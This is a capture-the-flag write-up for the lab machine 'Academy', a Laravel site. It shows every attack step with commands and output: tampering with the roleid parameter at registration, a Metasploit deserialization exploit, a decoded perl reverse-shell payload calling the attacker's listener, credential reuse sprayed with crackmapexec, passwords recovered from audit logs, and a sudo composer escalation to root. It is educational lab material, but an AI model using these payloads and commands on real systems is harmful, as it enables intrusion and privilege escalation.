# Academy
```
Difficulty: Easy
Operating System: Linux
Hints: True
```
#### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap Scan, Website Enumeration, Parameter Manipulation | Identified open ports 22 (SSH) and 80 (HTTP). Manipulated `roleid` during registration to gain admin access on `academy.htb`. |
| 2 | (Web) | Virtual Host Enumeration, Debug Page Analysis | Discovered a new subdomain `dev-staging.academy.htb` via the admin panel, which revealed a Laravel debug page disclosing the `APP_KEY`. |
| 3 | www-data | Laravel RCE (CVE-2018-15133) | Used the `APP_KEY` with a Metasploit module to exploit a deserialization vulnerability and gain a reverse shell as the `www-data` user. |
| 4 | www-data | File Enumeration | Found the `.env` file containing the password `mySup3rP4s5w0rd!!`. |
| 5 | cry0l1t3 | Password Reuse, SSH Login | Used `crackmapexec` to identify that the password from the `.env` file was reused for the user `cry0l1t3` and logged in via SSH. |
| 6 | cry0l1t3 | Log Enumeration (`adm` group) | Used `aureport --tty` to read audit logs, finding the password for another user: `mrb3n:mrb3n_Ac@d3my!`. |
| 7 | mrb3n | `sudo -l` | Switched to the `mrb3n` user and discovered they could run `/usr/bin/composer` as `root` without a password. |
| 8 | root | Composer Privilege Escalation | Used a GTFOBins payload with `sudo /usr/bin/composer` to execute a root shell. |

## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see we have only port 22 and 80 opened, so without further doing let's dig into port 80.  
Before opening port 80 we can see in nmap that the site is performing a redirection to ```Did not follow redirect to http://academy.htb/``` so let's set up this host in our /etc/hosts file and let's start enumerating web-server.  
First thing, hitting the website, we can see an 'academy' page. The page shows an image and nothing more, so, let's start enumerating the web-server looking for files and directories:  
```
/images               (Status: 301) [Size: 311] [--> http://academy.htb/images/]
/home.php             (Status: 302) [Size: 55034] [--> login.php]
/admin.php            (Status: 200) [Size: 2633]
/login.php            (Status: 200) [Size: 2627]
/.                    (Status: 200) [Size: 2117]
/index.php            (Status: 200) [Size: 2117]
/register.php         (Status: 200) [Size: 3003]
/config.php           (Status: 200) [Size: 0]
```
as we can see we discovered various links.  
Now we can try various scan, but at least, if we try to register a new account with the roleid (found in the registration request set to 1) we can register an admin account.  
```
POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Origin: http://academy.htb
Connection: close
Referer: http://academy.htb/register.php
Cookie: PHPSESSID=bv9043rgksnjungmplpk3ktqtn
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

uid=b0d&password=Password&confirm=Password&roleid=1
```
After we register the account we can login with the given credentials to admin.php, here we can find the below: 
![](Attachments/Pasted%20image%2020220518104752.png)
As we can see here the site disclose information regarding an additional domain in the site ```dev-staging.academy.htb``` so now we can start enumerate this virtualhost.  
As we open this site we can see that it shows an error message disclosing interesting information. 
As we can notice the site is running on top of laravel which is a php framework, so let's look for available exploits for laravel.  
```
[root@kali Academy ]$ searchsploit laravel                 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path                           
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Aimeos Laravel ecommerce platform 2021.10 LTS - 'sort' SQL injection                                                                                                                                       | php/webapps/50538.txt           
Laravel 8.4.2 debug mode - Remote code execution                                                                                                                                                           | php/webapps/49424.py            
Laravel Administrator 4 - Unrestricted File Upload (Authenticated)                                                                                                                                         | php/webapps/49112.py            
Laravel - 'Hash::make()' Password Truncation Security                                                                                                                                                      | multiple/remote/39318.txt       
Laravel Log Viewer < 0.13.0 - Local File Download                                                                                                                                                          | php/webapps/44343.py            
Laravel Nova 3.7.0 - 'range' DoS                                                                                                                                                                           | php/webapps/49198.txt           
Laravel Valet 2.0.3 - Local Privilege Escalation (macOS)                                                                                                                                                   | macos/local/50591.py            
PHP Laravel 8.70.1 - Cross Site Scripting (XSS) to Cross Site Request Forgery (CSRF)                                                                                                                       | php/webapps/50525.txt           
PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasploit)                                                                                                    | linux/remote/47129.rb           
UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload                                                                                                                                         | php/webapps/46389.py            
UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read                                                                                                                                                  | php/webapps/48166.txt           
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results                                     
```
As we can see there are plenty of exploits available.
## Foothold
Let's start with the metasploit module ```PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasploit)```.    
as we can test if we set all the parameters:  
```

   Name       Current Setting  Required  Description       
   ----       ---------------  --------  -----------       
   APP_KEY                     no        The base64 encoded APP_KEY string from the .env file                         
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]                 
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit                                                                                                        
   RPORT      80               yes       The target port (TCP)                                                        
   SSL        false            no        Negotiate SSL/TLS for outgoing connections                                   
   TARGETURI  /                yes       Path to target webapp                                                        
   VHOST                       no        HTTP server virtual host                                                     


Payload options (cmd/unix/reverse_perl):                   

   Name   Current Setting  Required  Description           
   ----   ---------------  --------  -----------           
   LHOST                   yes       The listen address (an interface may be specified)                               
   LPORT  4444             yes       The listen port       


Exploit target:                                            

   Id  Name                                                
   --  ----                                                
   0   Automatic                                           

                
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=                                                                                                                     
APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=                                                        
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set Proxies http:127.0.0.1:8080                              
Proxies => http:127.0.0.1:8080                             
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS 10.10.10.217                                      
RHOSTS => 10.10.10.217                                     
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS 10.10.10.215                                      
RHOSTS => 10.10.10.215                                     
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set VHOST dev-staging-01.academy.htb                                                                                                                                                
VHOST => dev-staging-01.academy.htb                        
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set LHOST tun0                                               
LHOST => 10.10.14.14                                       
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set LPORT 9001                                               
LPORT => 9001                                              
msf6 exploit(unix/http/laravel_token_unserialize_exec) >   
```
The ```APP_KEY``` value can be retriven from the error dump we previously saw in the ```dev-staging.academy.htb``` error page.  
Now, if we run the exploit:  
```
msf6 exploit(unix/http/laravel_token_unserialize_exec) > run                                                          

[*] Started reverse TCP handler on 10.10.14.14:9001        
[*] Command shell session 1 opened (10.10.14.14:9001 -> 10.10.10.215:33554 ) at 2022-05-17 17:28:25 +0200                          
ls                                                         
css                                                        
favicon.ico                                                
index.php                                                  
js                                                         
robots.txt                                                 
web.config    
```
we get a reverseshell as www-data. Now, as always when dealing with metasploit, let's try to analyse what the script is doing.  
As we can see in burp, the only thing it is doing actually is to send a base64 encoded payload in the X-XSRF-TOKEN header:  
```
{"iv":"SZXUno+UD5VJju97b65jJg==","value":"0q2roAGO0A7HNZZD\/AA3VikB9LmaR7NHeJd\/wg2ZNxQM+zPoi5X7X8ggolGfuEx\/NhRd0Yin7HwoapawMIAvCQ2pkqd+6H1vGlbgHoZ1Wo2CN+EcvbVWpPsCUc1p\/rO9HwC5D2owSgbFGIv3QPRxlJKcqc55YAHrj9jlYedaXVlMm29H+RP1j\/CF71cA8GBgIzspWWPgf6GfxDEuadEBw80RchAr8bHAeLojedW2COxI03cPloUORb81cRBYBvKzaCfYRzyXO53H7KTMLgCuPQjXtDNwO5Y3eUeSfovpaBBlCbXNitgXO1YNJGjVE2aMPeRYEnTuw0I\/0lT6ki6VunTzXmM6Vf0xXQYWsYfhcqkOXa8EFqoY\/SkY+1Nit+TtW5d37SSAssR1qLJr04Bd\/0ZD5OKg4ppO0tyhffyrxhRwWs0MdGTLtZz7TWZSuEO0nCZg5eMpUYWCcUMvGyWMc1fwOIsb3TteutG3HIEgi25GpegArFtYZjKQpZfPCCDmxb2bZmXKffyl0XpuSlJL3TS58tg0HbBgd+ZIVT1Oih4=","mac":"82eb4dadea7f73084cecaf12bee5e948f7af338142da4cdca276688fd614dfe4"}
```
The decoded payload contains: iv, value, mac. Hence, we can assume that this is the result of some form of encryption. Since the exploit asks for APP_KEY value, we can assume that this is the key for the encryption.  
Poking around on google for this CVE, we can find [this gitub repo](https://github.com/kozmic/laravel-poc-CVE-2018-15133/blob/master/cve-2018-15133.php) of a dude that created a script for crafting a payload.  
As we can confirm APP_KEY is used as encryption key for the value field, so now we can go to [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'Base64','string':'dBLUaMuZz7Iq06XtL/Xnz/90Ejq%2BDEEynggqubHWFj0%3D'%7D,%7B'option':'Base64','string':'SZXUno%2BUD5VJju97b65jJg%3D%3D'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=dFFvSVY5dVZ4T3AzR2RwUGEyNWRlb2o0RlpzQXBFVmp0cHk0czlwcVkyTHRlM0M1cyswVlMwWHlRWTBiQmVpTXozR3UwK1M0SVFIOGpadEhXYWVRcGxWbEJzUE9DV2pQdjlicFhwdWRGTElFMHdJeGNaUzJSZU5VZE1MaDVhNXUwVXpcL3k3YnZJUUZtdUdoRlhNMmRKa3JTQm5SbnJVdHJmK01EdVZ3YWFhNWNVaExnTzJjUEdkV1hMZHEwS2p2b0tIdFhPSUZ3RHpNb0JNRDlrSUg0M0lKemtXeGhEZDZlY3libDFDYUxNeHpaMHozSnBFemNMcE1rY1NjUkx1czZ3XC93K0tycWdqczluekV6R0dac1NtSXhRVEJLNlUwSDB6UGd1eXN1YmVxQUhGeHd3MTFXc2tCNlpZRVhoODcwQzUyZFE1N0Q5TVN0bkVFOGI1cnRvbmF0OGFXYmlDSmpCM2l0KzM0Z1ZPOVN0VkV4V0ZBaCtcL2pzZnMxSkhvMEdsODZ3UlZrcm9zTGFuSkE5OTdKbVF5SFB4bDczMmY4XC9VSlN0djNDSFN0eDFDeVQ3VStXUEJkd240VGpXRFM3ZFJyUnBtSGxkMVcyN3k0YjR0eXk3Q2VRPT0) and try to decode the value field. As we open the previously pasted link we can see the recepie, however, all we need to do is decode from base64 and decrypt from AES-256-CBC with base64 iv/key and raw input.  
and we will get the following perl payload.
```
O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:".*.events";O:15:"Faker\Generator":1:{s:13:".*.formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:".*.event";s:230:"perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.14.14:9001");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'";}
```
**Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:
- Write complex data to inter-process memory, a file, or a database
- Send complex data, for example, over a network, between different components of an application, or in an API call
Crucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.
**Deserialization** is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized. The website's logic can then interact with this deserialized object, just like it would with any other object.
Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.
It is even possible to replace a serialized object with an object of an entirely different class. Alarmingly, objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. For this reason, insecure deserialization is sometimes known as an "object injection" vulnerability.
An object of an unexpected class might cause an exception. By this time, however, the damage may already be done. Many deserialization-based attacks are completed **before** deserialization is finished. This means that the deserialization process itself can initiate an attack, even if the website's own functionality does not directly interact with the malicious object. For this reason, websites whose logic is based on strongly typed languages can also be vulnerable to these techniques.
More info related to unsecure deserialization can be found [here](https://portswigger.net/web-security/deserialization)

## User
After having an initial foothold on the server let's look for credentials inside code.  
After few greps for 'pass' keyword we can find an env file containing a new set of credentials:  
```
www-data@academy:/var/www/html/academy$ cat .env           
[... SNIP ...]                                        
DB_PASSWORD=mySup3rP4s5w0rd!!                              
[... SNIP ...]
```
Now let's try this creds against the machine and see if this is affected by a password reuse vulnerability.  
Before doing so, we need to download a list of users of this box since we have more than one:
```
egre55
mrb3n
cry0l1t3
21y4d
ch4p
g0blin
```
Now we can use crackmapexec to test the newly discovered password against all this users:  
```
[root@kali Academy ]$ crackmapexec ssh 10.10.10.215 -u system_users.txt -p 'mySup3rP4s5w0rd!!'                                                                                                                                               
SSH         10.10.10.215    22     10.10.10.215     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1                       
SSH         10.10.10.215    22     10.10.10.215     [-] egre55:mySup3rP4s5w0rd!! Authentication failed.               
SSH         10.10.10.215    22     10.10.10.215     [-] mrb3n:mySup3rP4s5w0rd!! Authentication failed.                
SSH         10.10.10.215    22     10.10.10.215     [+] cry0l1t3:mySup3rP4s5w0rd!!    
```
As we can see this password can be used for user cry0l1t3
```
[root@kali repos ]$ ssh -l cry0l1t3 $TARGET
cry0l1t3@10.10.10.215's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 18 May 2022 09:52:27 AM UTC

  System load:             0.0
  Usage of /:              40.4% of 13.72GB
  Memory usage:            33%
  Swap usage:              0%
  Processes:               219
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.215
  IPv6 address for ens160: dead:beef::250:56ff:feb9:e352


89 updates can be installed immediately.
42 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue May 17 19:39:14 2022 from 10.10.14.14
$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)

```
## Root
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice that cry0l1t3 user is part of adm group and hence he can read logs
```
╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
 ╚═══════════════════╝
OS: Linux version 5.4.0-52-generic (buildd@lgw01-amd64-060) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020
User & Groups: uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```
As we have seen in [Doctor.htb](Doctor.md) having a user inside this group can be dangerous because most likey, also in a real world scenario, logs will contain password, hece let's dig int /var/log.  
After poking around for a while we can notice an audit directory.  
Now we can use ```aureport``` in order to grab info and statistics from the audit logs.  
```
cry0l1t3@academy:/var/log/audit$ aureport                  

Summary Report                                             
======================                                     
Error opening config file (Permission denied)              
NOTE - using built-in logs: /var/log/audit/audit.log       
Range of time in logs: 01/01/70 00:00:00.000 - 05/17/22 20:12:01.235                                                  
Selected time for report: 01/01/70 00:00:00 - 05/17/22 20:12:01.235                                                   
Number of changes in configuration: 61                     
Number of changes to accounts, groups, or roles: 7         
Number of logins: 21                                       
Number of failed logins: 33                                
Number of authentications: 77                              
Number of failed authentications: 10                       
Number of users: 5                                         
Number of terminals: 10                                    
Number of host names: 7                                    
Number of executables: 11                                  
Number of commands: 6                                      
Number of files: 0                                         
Number of AVC's: 0                                         
Number of MAC events: 0                                    
Number of failed syscalls: 0                               
Number of anomaly events: 0                                
Number of responses to anomaly events: 0                   
Number of crypto events: 0                                 
Number of integrity events: 0                              
Number of virt events: 0                                   
Number of keys: 0                                          
Number of process IDs: 18731                               
Number of events: 117709 
```
enumerating flags of ```aureport``` we can use the ```--tty``` flag:  
```
cry0l1t3@academy:/var/log/audit$ aureport --tty            

TTY Report                                                 
===============================================            
# date time event auid term sess comm data                 
===============================================            
Error opening config file (Permission denied)              
NOTE - using built-in logs: /var/log/audit/audit.log       
1. 08/12/20 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>           
2. 08/12/20 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>     
3. 08/12/20 02:28:24 89 0 ? 1 sh "whoami",<nl>             
4. 08/12/20 02:28:28 90 0 ? 1 sh "exit",<nl>               
5. 08/12/20 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>       
6. 08/12/20 02:30:43 94 0 ? 1 nano <delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
7. 08/12/20 02:32:13 95 0 ? 1 nano <down>,<up>,<up>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<backspace>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>                                                                               
8. 08/12/20 02:32:55 96 0 ? 1 nano "6",<^X>,"y",<ret>      
9. 08/12/20 02:33:26 97 0 ? 1 bash "ca",<up>,<up>,<up>,<backspace>,<backspace>,"cat au",<tab>,"| grep data=",<ret>,"cat au",<tab>,"| cut -f11 -d\" \"",<ret>,<up>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<right>,<right>,"grep data= | ",<ret>,<up>," > /tmp/data.txt",<ret>,"id",<ret>,"cd /tmp",<ret>,"ls",<ret>,"nano d",<tab>,<ret>,"cat d",<tab>," | xx",<tab>,"-r -p",<ret>,"ma",<backspace>,<backspace>,<backspace>,"nano d",<tab>,<ret>,"cat dat",<tab>," | xxd -r p",<ret>,<up>,<left>,"-",<ret>,"cat /var/log/au",<tab>,"t",<tab>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,"d",<tab>,"aud",<tab>,"| grep data=",<ret>,<up>,<up>,<up>,<up>,<up>,<down>,<ret>,<up>,<up>,<up>,<ret>,<up>,<up>,<up>,<ret>,"exit",<backspace>,<backspace>,<backspace>,<backspace>,"history",<ret>,"exit",<ret>
10. 08/12/20 02:33:26 98 0 ? 1 sh "exit",<nl>              
11. 08/12/20 02:33:30 107 0 ? 1 sh "/bin/bash -i",<nl>     
12. 08/12/20 02:33:36 108 0 ? 1 bash "istory",<ret>,"history",<ret>,"exit",<ret>                                      
13. 08/12/20 02:33:36 109 0 ? 1 sh "exit",<nl>             
cry0l1t3@academy:/var/log/audit$                                   

```
And here we can find a password ```mrb3n:mrb3n_Ac@d3my!``` for another user.  
Once we swich to that user, intuitively, we can run a ```sudo -l```, provide the password and we will see the following:  
```
mrb3n@academy:~$ sudo -l                                             
[sudo] password for mrb3n:                                 
Matching Defaults entries for mrb3n on academy:            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User mrb3n may run the following commands on academy:      
    (ALL) /usr/bin/composer  
```
Now, all we have to do is search for [GTFOBins for composer](https://gtfobins.github.io/gtfobins/composer/) and run the privilege escalation commands:  
```
mrb3n@academy:~$ TF=$(mktemp -d)                           
mrb3n@academy:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json                              
mrb3n@academy:~$ sudo composer --working-dir=$TF run-script x                                                         
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0                  
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0      
Do not run Composer as root/super user! See https://getcomposer.org/root for details                                  
> /bin/sh -i 0<&3 1>&3 2>&3                                
# id
uid=0(root) gid=0(root) groups=0(root)
```